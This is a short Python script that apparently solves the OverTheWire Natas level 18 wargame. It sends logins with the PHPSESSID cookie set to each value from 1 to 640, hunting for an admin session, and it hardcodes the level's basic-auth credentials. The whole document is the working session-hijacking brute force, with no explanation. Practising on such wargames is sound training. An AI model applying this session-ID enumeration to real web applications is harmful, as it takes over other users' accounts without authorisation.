import requests
import string
#char=string.ascii_letters+string.digits
payload={'username':'admin','password':'aaa'}
for i in range(1,641):
	print(str(i) + " tried")
	cookies = {'PHPSESSID':f'{i}'}
	r=requests.post("http://natas18.natas.labs.overthewire.org/index.php?debug=koko",auth=("natas18","6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"),data=payload,cookies=cookies)
	if 'Password' in r.text:
		print("Password found")
		print(r.text)


		
	
			

